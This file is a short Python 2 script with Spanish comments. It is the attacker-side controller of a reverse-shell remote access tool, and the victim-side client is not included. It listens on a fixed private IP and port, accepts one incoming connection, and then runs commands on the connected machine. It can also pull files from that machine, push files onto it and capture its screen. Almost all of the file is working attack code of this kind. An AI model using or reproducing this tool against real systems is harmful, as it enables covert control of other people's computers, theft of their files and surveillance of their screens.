#!/usr/bin/env python
#_*_ coding: utf8 _*_

'''
- Interprete que se va a ejecutar
- Codificación del archivo
'''

import socket
import base64

def shell():
    current_dir = target.recv(1024)
    count = 0
    
    while True:
        comando = raw_input("{}~#: ".format(current_dir))
        if comando == "exit":
            target.send(comando)
            break
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print(res)
        elif comando == "":
            pass
        elif comando[:8] == "download":
            target.send(comando)
            with open(comando[9:], 'wb') as file_download:
                datos = target.recv(30000)
                file_download.write(base64.b64decode(datos))
        elif comando[:6] == "upload":
            try:
                target.send(comando)
                with open(comando[7:], 'rb') as file_upload:
                    target.send(base64.b64encode(file_upload.read()))
            except Exception as ex:
                print("Ocurrió un error en la salida " + ex.message)
        elif comando[:10] == "screenshot":
            target.send(comando)
            with open("monitor-%d.png" % count, 'wb') as screen:
                datos = target.recv(1000000)
                data_decode = base64.b64decode(datos)
                if data_decode == "fail": # establecido del lado del cliente cuando falle la captura
                    print("No se pudo tomar la captura de pantalla")
                else:
                    screen.write(data_decode)
                    print("Captura tomada con exito")
                    count = count + 1
        else:
            target.send(comando)
            res = target.recv(30000)
            if res == "1":
                continue
            else:
                print(res)

def upserver():
    global server
    global ip
    global target

    # TCP IPV4
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Level = only socket
    # reuseador
    # 1 = for available
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.252.105', 7777))
    server.listen(1)

    print("Corriendo servidor y esperando conexiones...")

    target, ip = server.accept()
    print("Conexión recibida de: " + str(ip[0]))

upserver()
shell()
server.close()